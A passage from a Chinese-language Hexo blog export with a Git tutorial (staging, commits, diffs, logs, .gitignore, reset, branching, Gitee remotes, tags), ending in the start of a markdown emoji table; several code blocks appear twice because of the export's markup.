keyword">select</span> hunks interactively-e, --edit            edit current <span class="token function">diff</span> and apply-f, --force           allow adding otherwise ignored files-u, --update          update tracked files--renormalize         renormalize EOL of tracked files <span class="token punctuation">(</span>implies -u<span class="token punctuation">)</span>-N, --intent-to-add   record only the fact that the path will be added later-A, --all             add changes from all tracked and untracked files--ignore-removal      ignore paths removed <span class="token keyword">in</span> the working tree <span class="token punctuation">(</span>same as --no-all<span class="token punctuation">)</span>--refresh             don't add, only refresh the index--ignore-errors       just skip files <span class="token function">which</span> cannot be added because of errors--ignore-missing      check <span class="token keyword">if</span> - even missing - files are ignored <span class="token keyword">in</span> dry run--chmod <span class="token punctuation">(</span>+<span class="token operator">|</span>-<span class="token punctuation">)</span>x        override the executable bit of the listed files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用的有</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> add 文件名  <span class="token comment" spellcheck="true"># 添加单个文件</span><span class="token function">git</span> add -u     <span class="token comment" spellcheck="true"># update被tracked 文件</span><span class="token function">git</span> add -A     <span class="token comment" spellcheck="true"># 添加所有</span><span class="token function">git</span> add <span class="token keyword">.</span>     <span class="token comment" spellcheck="true">#  添加当前工作区中所有文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-提交本地仓库git-commit"><a href="#5-提交本地仓库git-commit" class="headerlink" title="5.提交本地仓库git commit"></a>5.提交本地仓库<code>git commit</code></h4><blockquote><p>提交修改</p><pre class="line-numbers language-bash">git commit -m &quot;description&quot;   # 提交本地仓库,并添加描述</code></pre></blockquote><h4 id="6-查看working-tree状态"><a href="#6-查看working-tree状态" class="headerlink" title="6.查看working tree状态"></a>6.查看<code>working tree</code>状态</h4><blockquote><pre><code class="bash"><code class="language-bash">git commit -m &quot;description&quot;   # 提交本地仓库,并添加描述</code></pre></blockquote><h4 id="6-查看working-tree状态"><a href="#6-查看working-tree状态" class="headerlink" title="6.查看working tree状态"></a>6.查看<code>working tree</code>状态</h4><blockquote><pre><code class="bash"># git status 官方解释是 show the working tree ,应该是能查看一个文件所有的逻辑状态信息git  statusgit status -s  # 结果以简短的形式输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="7-查看差异变化git-diff"><a href="#7-查看差异变化git-diff" class="headerlink" title="7.查看差异变化git diff"></a>7.查看差异变化<code>git diff</code></h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># git-diff - Show changes between commits, commit and working tree, etc</span><span class="token comment" spellcheck="true"># 显示提交,提交和working tree 之间的所有的更改</span><span class="token function">git</span> <span class="token function">diff</span> <span class="token comment" spellcheck="true"># 工作区与缓存区的差异</span><span class="token function">git</span> <span class="token function">diff</span> 分支名 <span class="token comment" spellcheck="true">#工作区与某分支的差异，远程分支这样写：remotes/origin/分支名</span><span class="token function">git</span> <span class="token function">diff</span> HEAD  <span class="token comment" spellcheck="true"># 工作区与HEAD指针指向的内容差异</span><span class="token function">git</span> <span class="token function">diff</span> 提交id 文件路径 <span class="token comment" spellcheck="true"># 工作区某文件当前版本与历史版本的差异</span><span class="token function">git</span> <span class="token function">diff</span> --stage <span class="token comment" spellcheck="true"># 工作区文件与上次提交的差异(1.6 版本前用 --cached)</span><span class="token function">git</span> <span class="token function">diff</span> 版本TAG <span class="token comment" spellcheck="true"># 查看从某个版本后都改动内容</span><span class="token function">git</span> <span class="token function">diff</span> 分支A 分支B <span class="token comment" spellcheck="true"># 比较从分支A和分支B的差异(也支持比较两个TAG)</span><span class="token function">git</span> <span class="token function">diff</span> 分支A<span class="token punctuation">..</span>.分支B <span class="token comment" spellcheck="true"># 比较两分支在分开后各自的改动</span><span class="token comment" spellcheck="true"># 另外：如果只想统计哪些文件被改动，多少行被改动，可以添加 --stat 参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="8-查看历史记录git-log"><a href="#8-查看历史记录git-log" class="headerlink" title="8.查看历史记录git log"></a>8.查看历史记录<code>git log</code></h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> log <span class="token comment" spellcheck="true"># 查看所有commit记录(SHA-A校验和，作者名称，邮箱，提交时间，提交说明)</span><span class="token function">git</span> log -p -次数 <span class="token comment" spellcheck="true"># 查看最近多少次的提交记录</span><span class="token function">git</span> log --stat <span class="token comment" spellcheck="true"># 简略显示每次提交的内容更改</span><span class="token function">git</span> log --name-only <span class="token comment" spellcheck="true"># 仅显示已修改的文件清单</span><span class="token function">git</span> log --name-status <span class="token comment" spellcheck="true"># 显示新增，修改，删除的文件清单</span><span class="token function">git</span> log --oneline <span class="token comment" spellcheck="true"># 让提交记录以精简的一行输出</span><span class="token function">git</span> log –graph –all --online <span class="token comment" spellcheck="true"># 图形展示分支的合并历史</span><span class="token function">git</span> log --author<span class="token operator">=</span>作者  <span class="token comment" spellcheck="true"># 查询作者的提交记录(和grep同时使用要加一个--all--match参数)</span><span class="token function">git</span> log --grep<span class="token operator">=</span>过滤信息 <span class="token comment" spellcheck="true"># 列出提交信息中包含过滤信息的提交记录</span><span class="token function">git</span> log -S查询内容 <span class="token comment" spellcheck="true"># 和--grep类似，S和查询内容间没有空格</span><span class="token function">git</span> log fileName <span class="token comment" spellcheck="true"># 查看某文件的修改记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="9-gitignore"><a href="#9-gitignore" class="headerlink" title="9..gitignore"></a>9.<code>.gitignore</code></h4><blockquote><p>未<code>tracked</code>的文件添加到缓存区后,<code>Git</code>就会开始跟踪这个文件.对于一些比如:<strong>自动生成的文件</strong>,<strong>日志</strong>,<strong>临时编译文件等</strong>,就 没必要进行跟踪了,这个时候可以编写<code>.gitignore</code>文件,在里面 把不需要跟踪的文件或文件夹都写上,<code>git</code>就不会对这些文件进行跟踪.<br>另外<code>.gitignore</code>文件与<code>.git</code>文件夹在同级目录下.</p><p>已我上面刚创建的目录为例:</p><ol><li>创建<code>.gitigore</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cd</span> git_learn$ <span class="token function">touch</span> .gitignore$ vim .gitignore<span class="token punctuation">..</span>.<span class="token comment" spellcheck="true"># 忽视c结尾文件</span>*.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>提交版本控制,注意<code>.gitignore</code>是可以版本控制的.</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> add <span class="token keyword">.</span>$ <span class="token function">git</span> commit -m <span class="token string">'add ignore file'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>尝试添加一个<code>.c</code>文件.检验的方法就是创建完毕后,执行<code>git status</code>,工作区是<code>clean</code>的,干净的.</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">touch</span> text.c$ <span class="token function">git</span> status位于分支 master无文件要提交，干净的工作区<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p>如果不想自己写，可以直接到：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a> 复制粘贴.</p><p>示例:</p><pre class="line-numbers language-shell"><code class="language-shell"># 忽略所有以 .c结尾的文件*.c# 但是 stream.c 会被git追踪!stream.c# 只忽略当前文件夹下的TODO文件, 不包括其他文件夹下的TODO例如: subdir/TODO/TODO# 忽略所有在build文件夹下的文件build/# 忽略 doc/notes.txt, 但不包括多层下.txt例如: doc/server/arch.txtdoc/*.txt# 忽略所有在doc目录下的.pdf文件doc/**/*.pdf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:配置<code>.gitignore</code>只对那些<strong>没有添加到版本控制系统</strong>的文件生效(<strong>未Tracked的文件</strong>)</p><p>比如:有<code>A,B</code>两个文件,你先把他两个<code>add</code>,然后在<code>.gitignore</code>文件中 配置了不跟踪这两个文件,那么命令不会生效.</p><p>所以,最好的做法就是在项目刚开始的时候,先添加<code>.gitignore</code>文件.当然,即使是发生了,还是有解决方法的,可以键入下述命令清除标记状态,然后先添加<code>.gitignore</code>,再添加文件即可：</p><pre class="line-numbers language-bash">git rm -r --cached . # 清除版本控制标记，.代表所有文件，也可指定具体文件</code></pre></blockquote><h3 id="5-版本回溯"><a href="#5-版本回溯" class="headerlink" title="5.版本回溯"></a>5.版本回溯</h3><h4 id="1-文件恢复git-checkout"><a href="#1-文件恢复git-checkout" class="headerlink" title="1.文件恢复git checkout"></a>1.文件恢复<code>git checkout</code></h4><blockquote><p>切换分支或恢复文件</p><pre><code class="bash"><code class="language-bash">git rm -r --cached . # 清除版本控制标记，.代表所有文件，也可指定具体文件</code></pre></blockquote><h3 id="5-版本回溯"><a href="#5-版本回溯" class="headerlink" title="5.版本回溯"></a>5.版本回溯</h3><h4 id="1-文件恢复git-checkout"><a href="#1-文件恢复git-checkout" class="headerlink" title="1.文件恢复git checkout"></a>1.文件恢复<code>git checkout</code></h4><blockquote><p>切换分支或恢复文件</p><pre><code class="bash">$ git checkout -- filename     # 丢球工作区中的某个文件修改$ git checkout -- .            # 丢弃工作区中的所有修改 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">touch</span> 2.txt$ <span class="token function">git</span> statusOn branch masterUntracked files:<span class="token punctuation">(</span>use <span class="token string">"git add &lt;file>..."</span> to include <span class="token keyword">in</span> what will be committed<span class="token punctuation">)</span>     2.txtnothing added to commit but untracked files present <span class="token punctuation">(</span>use <span class="token string">"git add"</span> to track<span class="token punctuation">)</span>$ <span class="token function">git</span> add 2.txt$ <span class="token function">git</span> statusOn branch masterChanges to be committed:<span class="token punctuation">(</span>use <span class="token string">"git restore --staged &lt;file>..."</span> to unstage<span class="token punctuation">)</span>     new file:   2.txt$ <span class="token function">git</span> commit -m <span class="token string">'add 2.txt'</span><span class="token punctuation">[</span>master 353e702<span class="token punctuation">]</span> add 2.txt1 <span class="token function">file</span> changed, 0 insertions<span class="token punctuation">(</span>+<span class="token punctuation">)</span>, 0 deletions<span class="token punctuation">(</span>-<span class="token punctuation">)</span>create mode 100644 2.txt$ <span class="token function">git</span> statusOn branch masternothing to commit, working tree clean$ <span class="token function">rm</span> 2.txt$ <span class="token function">git</span> statusOn branch masterChanges not staged <span class="token keyword">for</span> commit:<span class="token punctuation">(</span>use <span class="token string">"git add/rm &lt;file>..."</span> to update what will be committed<span class="token punctuation">)</span><span class="token punctuation">(</span>use <span class="token string">"git restore &lt;file>..."</span> to discard changes <span class="token keyword">in</span> working directory<span class="token punctuation">)</span>     deleted:    2.txtno changes added to commit <span class="token punctuation">(</span>use <span class="token string">"git add"</span> and/or <span class="token string">"git commit -a"</span><span class="token punctuation">)</span>$ <span class="token function">git</span> checkout 2.txtUpdated 1 path from the index$ <span class="token function">git</span> statusOn branch masternothing to commit, working tree clean$ <span class="token function">ls</span>2.txt  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-git-reset"><a href="#2-git-reset" class="headerlink" title="2.git reset"></a>2.<code>git reset</code></h4><blockquote><p>每次的更改都会在<code>git</code>中留下记录值<code>HEAD</code>也就是<code>commit id</code>.根据这个<code>HEAD</code> 可以跳回到原来的状态.</p><pre class="line-numbers language-bash">$ git reset  </code></pre><p>可以通过<code>git log</code>来查看更改的<code>HEAD</code>值</p><pre><code class="bash"><code class="language-bash">$ git reset  </code></pre><p>可以通过<code>git log</code>来查看更改的<code>HEAD</code>值</p><pre><code class="bash"># 新建一个测试文件$ touch 3.txt# 编辑测试文件,并添加数字 1,2,3,4$ vim 3.txt$ git statusOn branch masterUntracked files:(use "git add <file>..." to include in what will be committed)     3.txt$ git add 3.txt$ git commit -m "add 3.txt"[master e38dbcb] add 3.txt1 file changed, 4 insertions(+)create mode 100644 3.txt$ git statusOn branch masternothing to commit, working tree clean# 在测试文件中新添加数字 5$ vim 3.txt$ git statusOn branch masterChanges not staged for commit:(use "git add <file>..." to update what will be committed)(use "git restore <file>..." to discard changes in working directory)     modified:   3.txtno changes added to commit (use "git add" and/or "git commit -a")$ git add 3.txt$ git commit -m 'add 5 in 3.txt'[master 840106f] add 5 in 3.txt1 file changed, 1 insertion(+)$ git statusOn branch masternothing to commit, working tree clean# 查看commit id$ git logcommit 840106f762192b023f26abfd1e6c2a55b96379f5 (HEAD -> master) add 5 in 3.txt$ ls2.txt  3.txt  test.txt  test1$ cat 3.txt12345# 回溯文件的 commit id$ git reset --hard e38dbcb124  # id号不用写全HEAD is now at e38dbcb add 3.txt$ ls2.txt  3.txt  test.txt  test1c$ cat 3.txt1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-查看历史命令git-reflog"><a href="#3-查看历史命令git-reflog" class="headerlink" title="3.查看历史命令git reflog"></a>3.查看历史命令<code>git reflog</code></h4><blockquote><pre class="line-numbers language-bash">$ git reflog   # 查看指令,但是不会永久保存,git会自己定时清理</code></pre></blockquote><h4 id="4-查看某次提交的内容git-show"><a href="#4-查看某次提交的内容git-show" class="headerlink" title="4.查看某次提交的内容git show"></a>4.查看某次提交的内容<code>git show</code></h4><blockquote><pre><code class="bash">$ git show &quot;commit id&quot;</code></pre></blockquote><h4 id="5-查看分支版本号"><a href="#5-查看分支版本号" class="headerlink" title="5.查看分支版本号"></a>5.查看分支版本号</h4><blockquote><pre><code class="bash">$ git rev-parse 分支名</code></pre></blockquote><h3 id="6-分支"><a href="#6-分支" class="headerlink" title="6.分支"></a>6.分支</h3><h4 id="1-分支的创建-切换"><a href="#1-分支的创建-切换" class="headerlink" title="1.分支的创建/切换"></a>1.分支的创建/切换</h4><blockquote><pre><code class="bash"><code class="language-bash">$ git reflog   # 查看指令,但是不会永久保存,git会自己定时清理</code></pre></blockquote><h4 id="4-查看某次提交的内容git-show"><a href="#4-查看某次提交的内容git-show" class="headerlink" title="4.查看某次提交的内容git show"></a>4.查看某次提交的内容<code>git show</code></h4><blockquote><pre><code class="bash">$ git show &quot;commit id&quot;</code></pre></blockquote><h4 id="5-查看分支版本号"><a href="#5-查看分支版本号" class="headerlink" title="5.查看分支版本号"></a>5.查看分支版本号</h4><blockquote><pre><code class="bash">$ git rev-parse 分支名</code></pre></blockquote><h3 id="6-分支"><a href="#6-分支" class="headerlink" title="6.分支"></a>6.分支</h3><h4 id="1-分支的创建-切换"><a href="#1-分支的创建-切换" class="headerlink" title="1.分支的创建/切换"></a>1.分支的创建/切换</h4><blockquote><pre><code class="bash"># 创建分支$ git branch 分支名# 查看分支$ git branch # 切换分支$ git checkout 分支名# 创建分支并切换到这个分支$ git checkout -b 分支名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 创建分支1</span>$ <span class="token function">git</span> branch branch_1<span class="token comment" spellcheck="true"># 查看所有的分支</span>$ <span class="token function">git</span> branchbranch_1* master<span class="token comment" spellcheck="true"># 创建分支2</span>$ <span class="token function">git</span> branch branch_2<span class="token comment" spellcheck="true"># 切换分支2</span>$ <span class="token function">git</span> checkout branch_2Switched to branch <span class="token string">'branch_2'</span><span class="token comment" spellcheck="true"># 创建文件</span>$ <span class="token function">touch</span> 2.txt$ vim 2.txt<span class="token comment" spellcheck="true"># 分支2中查看到2个文件</span>$ <span class="token function">ls</span>1.txt  2.txt$ <span class="token function">git</span> add <span class="token keyword">.</span>$ <span class="token function">git</span> commit -m <span class="token string">"add 2.txt in branch_2"</span><span class="token comment" spellcheck="true"># 切换到主分支</span>$ <span class="token function">git</span> checkout masterSwitched to branch <span class="token string">'master'</span><span class="token comment" spellcheck="true"># 查看到只有1个文件</span>$ <span class="token function">ls</span>1.txt<span class="token comment" spellcheck="true"># 查看所有的分区和所处的分区(* 为所在分区)</span>$ <span class="token function">git</span> branch  branch_1  branch_2* master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>GUI</code>界面中查看更容易:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10216.png" alt="10216"></p></blockquote><h4 id="2-分支合并"><a href="#2-分支合并" class="headerlink" title="2.分支合并"></a>2.分支合并</h4><blockquote><p>当我们修复完<code>bug</code>或者是开发新的特性后,需要合并回原理的主分支上.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> merge    <span class="token comment" spellcheck="true"># Join two or more development histories together </span>$ <span class="token function">git</span> rebase   <span class="token comment" spellcheck="true"># Reapply commits on top of another base tip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="3-分支删除"><a href="#3-分支删除" class="headerlink" title="3.分支删除"></a>3.分支删除</h4><blockquote><p>当分支完成自己的使命后,分支就不需要了,可以删除他</p><pre class="line-numbers language-bash">$ git branch -d 分支名</code></pre></blockquote><h3 id="7-远程仓库"><a href="#7-远程仓库" class="headerlink" title="7.远程仓库"></a>7.远程仓库</h3><h4 id="1-创建SSH-KEY"><a href="#1-创建SSH-KEY" class="headerlink" title="1.创建SSH KEY"></a>1.创建<code>SSH KEY</code></h4><blockquote><p>为了演示方便使用<code>gitee</code></p><p>如果本地用户主目录中没有<code>.ssh</code> 目录,则需要手动创建<code>ssh_key</code></p><pre><code class="bash">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; # 使用默认值即可</code></pre><pre><code class="bash"><code class="language-bash">$ git branch -d 分支名</code></pre></blockquote><h3 id="7-远程仓库"><a href="#7-远程仓库" class="headerlink" title="7.远程仓库"></a>7.远程仓库</h3><h4 id="1-创建SSH-KEY"><a href="#1-创建SSH-KEY" class="headerlink" title="1.创建SSH KEY"></a>1.创建<code>SSH KEY</code></h4><blockquote><p>为了演示方便使用<code>gitee</code></p><p>如果本地用户主目录中没有<code>.ssh</code> 目录,则需要手动创建<code>ssh_key</code></p><pre><code class="bash">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; # 使用默认值即可</code></pre><pre><code class="bash">$ cd .ssh/$ lsid_rsa    # 私钥,不能泄露id_rsa.pub  # 公钥,需要上传给服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-上传公钥"><a href="#2-上传公钥" class="headerlink" title="2.上传公钥"></a>2.上传公钥</h4><blockquote><p>登录<code>gitee</code>,并上传<code>ssh公钥</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10217.png" alt="10217"></p></blockquote><h4 id="3-新建一个远程仓库"><a href="#3-新建一个远程仓库" class="headerlink" title="3.新建一个远程仓库"></a>3.新建一个远程仓库</h4><blockquote><p>如图:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10218.png" alt="10218"></p></blockquote><h4 id="4-推送本地库到远程库"><a href="#4-推送本地库到远程库" class="headerlink" title="4.推送本地库到远程库"></a>4.推送本地库到远程库</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 关联本地仓库和远程仓库</span><span class="token function">git</span> remote add origin 远程仓库地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用git 地址</span>$ <span class="token function">git</span> remote add origin git@gitee.com:ningwenyan/test.git$ <span class="token function">git</span> remote -vorigin  git@gitee.com:ningwenyan/test.git <span class="token punctuation">(</span>fetch<span class="token punctuation">)</span>origin  git@gitee.com:ningwenyan/test.git <span class="token punctuation">(</span>push<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后,可以正常的<code>git push</code>和<code>git pull</code>进行推送</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> push -u origin master  <span class="token comment" spellcheck="true">#  -u参数 作为第一次提交使用， </span><span class="token comment" spellcheck="true"># 作用是把本地master分支和远程master分支关联起来(设置默认远程主机)， </span><span class="token comment" spellcheck="true"># 后续提交不需要这个参数！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其他命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote set-url origin 远程仓库地址<span class="token comment" spellcheck="true"># 也可以先删除origin后再添加</span><span class="token function">git</span> remote <span class="token function">rm</span> origin    <span class="token comment" spellcheck="true"># 删除仓库关联</span><span class="token function">git</span> remote add origin 远程仓库地址 <span class="token comment" spellcheck="true"># 添加仓库关联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>windows系统添加用户名密码错误修改方法:可以在控制面板中找到<code>凭据管理器</code> 删除错误的用户名密码,然后重新登录.</p><p>本电脑不知是不是因为输错密码的缘故,弹出错误提示如下</p><pre class="line-numbers language-bash"><code class="language-bash">To gitee.com:ningwenyan/test1.git<span class="token operator">!</span> <span class="token punctuation">[</span>rejected<span class="token punctuation">]</span>        master -<span class="token operator">></span> master <span class="token punctuation">(</span>non-fast-forward<span class="token punctuation">)</span>error: failed to push some refs to <span class="token string">'git@gitee.com:ningwenyan/test1.git'</span>hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes <span class="token punctuation">(</span>e.g.hint: <span class="token string">'git pull ...'</span><span class="token punctuation">)</span> before pushing again.hint: See the <span class="token string">'Note about fast-forwards'</span> <span class="token keyword">in</span> <span class="token string">'git push --help'</span> <span class="token keyword">for</span> details.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决办法：使用git pull 合并分支</p><pre class="line-numbers language-bash">git pull -u -f  origin master  # 第一次加-f 后续就不用添加了</code></pre></blockquote><h4 id="5-从远程仓库克隆"><a href="#5-从远程仓库克隆" class="headerlink" title="5.从远程仓库克隆"></a>5.从远程仓库克隆</h4><blockquote><p>远端新建仓库</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10219.png" alt="10219"></p><p>执行如下命令</p><pre><code class="bash"><code class="language-bash">git pull -u -f  origin master  # 第一次加-f 后续就不用添加了</code></pre></blockquote><h4 id="5-从远程仓库克隆"><a href="#5-从远程仓库克隆" class="headerlink" title="5.从远程仓库克隆"></a>5.从远程仓库克隆</h4><blockquote><p>远端新建仓库</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10219.png" alt="10219"></p><p>执行如下命令</p><pre><code class="bash">$ git clone git@gitee.com:ningwenyan/test2.gitCloning into 'test2'...remote: Enumerating objects: 4, done.remote: Counting objects: 100% (4/4), done.remote: Compressing objects: 100% (4/4), done.remote: Total 4 (delta 0), reused 0 (delta 0)Receiving objects: 100% (4/4), done.$ lstest2/$ cd test2/$ lsREADME.en.md  README.md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="8-标签"><a href="#8-标签" class="headerlink" title="8.标签"></a>8.标签</h3><blockquote><p>打标签的作用,就是给项目的开发节点,加上语义化的名字,也即功能版本的别名. 打上标签名的同时,写上附带信息,可以方便项目日后维护过程中的回溯和复查.</p><p>另外,也可以通过标签记录,大致了解当前项目的向下兼容性,API的修改和迭代情况.</p></blockquote><h4 id="1-创建标签"><a href="#1-创建标签" class="headerlink" title="1.创建标签"></a>1.创建标签</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> tag -a <span class="token string">"tagname"</span> -m <span class="token string">"comment"</span> <span class="token string">"commit_id"</span><span class="token comment" spellcheck="true"># -a 标签名</span><span class="token comment" spellcheck="true"># -m 备注信息</span><span class="token comment" spellcheck="true"># commit_id 提交id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>示例:</p><pre class="line-numbers language-bash">$ git tag -a &#39;v0.1.0&#39; -m &quot;初始&quot; </code></pre><p>类似<code>v0.1.0</code>遵从一个简单的规范</p><ul><li>主版本号: 当你做了不兼容的<code>API</code>修改</li><li>次版本号: 向下兼容的功能性增加</li><li>修订号: 向下兼容的问题修正</li></ul></blockquote><h4 id="2-查看所有标签"><a href="#2-查看所有标签" class="headerlink" title="2.查看所有标签"></a>2.查看所有标签</h4><blockquote><pre><code class="bash">$ git tag</code></pre></blockquote><h4 id="3-查看具体标签信息"><a href="#3-查看具体标签信息" class="headerlink" title="3.查看具体标签信息"></a>3.查看具体标签信息</h4><blockquote><pre><code class="bash">$ git show tagname</code></pre></blockquote><h4 id="4-删除本地标签"><a href="#4-删除本地标签" class="headerlink" title="4.删除本地标签"></a>4.删除本地标签</h4><blockquote><pre><code class="bash"><code class="language-bash">$ git tag -a &#39;v0.1.0&#39; -m &quot;初始&quot; </code></pre><p>类似<code>v0.1.0</code>遵从一个简单的规范</p><ul><li>主版本号: 当你做了不兼容的<code>API</code>修改</li><li>次版本号: 向下兼容的功能性增加</li><li>修订号: 向下兼容的问题修正</li></ul></blockquote><h4 id="2-查看所有标签"><a href="#2-查看所有标签" class="headerlink" title="2.查看所有标签"></a>2.查看所有标签</h4><blockquote><pre><code class="bash">$ git tag</code></pre></blockquote><h4 id="3-查看具体标签信息"><a href="#3-查看具体标签信息" class="headerlink" title="3.查看具体标签信息"></a>3.查看具体标签信息</h4><blockquote><pre><code class="bash">$ git show tagname</code></pre></blockquote><h4 id="4-删除本地标签"><a href="#4-删除本地标签" class="headerlink" title="4.删除本地标签"></a>4.删除本地标签</h4><blockquote><pre><code class="bash">$ git tag -d tagname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown表情</title>
      <link href="/posts/31013.html"/>
      <url>/posts/31013.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/markdown_em.png" alt="markdown_em"></p><h1 id="Emoji表情"><a href="#Emoji表情" class="headerlink" title="Emoji表情"></a>Emoji表情</h1><p>将对应emoji表情的符号码复制后输入你的markdown文本即可显示emoji表情。<br>如<code>:blush:</code>，显示为:blush:</p><h2 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h2><table><thead><tr><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th></tr></thead><tbody><tr><td align="center"><code>:bowtie:</code></td><td align="center">:bowtie:</td><td align="center"><code>:smile:</code></td><td align="center">:smile:</td><td align="center"><code>:laughing:</code></td><td align="center">:laughing:</td></tr><tr><td align="center"><code>:blush:</code></td><td align="center">:blush:</td><td align="center"><code>:smiley:</code></td><td align="center">:smiley:</td><td align="center"><code>:relaxed:</code></td><td align="center">:relaxed:</td></tr><tr><td align="center"><code>:smirk:</code></td><td align="center">:smirk:</td><td align="center"><code>:heart_eyes:</code></td><td align="center">:heart_eyes:</td><td align="center"><code>:kissing_heart:</code></td><td 